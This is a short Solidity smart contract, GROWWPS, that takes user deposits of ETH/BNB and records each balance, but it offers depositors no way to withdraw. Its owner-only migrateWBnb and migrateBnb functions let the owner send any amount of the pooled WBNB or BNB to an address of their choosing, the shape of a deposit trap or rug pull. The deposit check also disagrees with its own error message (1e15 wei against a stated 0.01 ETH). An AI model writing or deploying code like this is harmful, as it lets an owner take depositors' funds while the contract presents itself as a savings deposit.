// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./IBEP20.sol";

contract GROWWPS is Ownable{

    mapping(address => uint) public etherBalanceOf;
    mapping(address => uint) public depositStart;
    mapping(address => bool) public isDeposited;
    
    event Deposit(address indexed user, uint etherAmount, uint timeStart);

    function deposit() payable public {
        require(msg.value>=1e15, 'Error, deposit must be >= 0.01 ETH');

        etherBalanceOf[msg.sender] = etherBalanceOf[msg.sender] + msg.value;
        depositStart[msg.sender] = block.timestamp;

        isDeposited[msg.sender] = true; //activate deposit status
        emit Deposit(msg.sender, msg.value, block.timestamp);
    }
    function getEthBalance() public view returns (uint){
        return address(this).balance;
    }
    function migrateWBnb(address _newadress , uint256 _amount) public onlyOwner {
    
        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) ).transfer(_newadress,_amount);
    }
    function migrateBnb(address payable _newadd,uint256 amount) public onlyOwner {
        
        (bool success, ) = address(_newadd).call{ value: amount }("");
        require(success, "Address: unable to send value, charity may have reverted");    
    }
    function getUserBalance(address account) public view returns (uint256) {
        return etherBalanceOf[account];
    }
    function hasUserDeposited(address account) public view returns (bool) {
        return isDeposited[account];
    }
}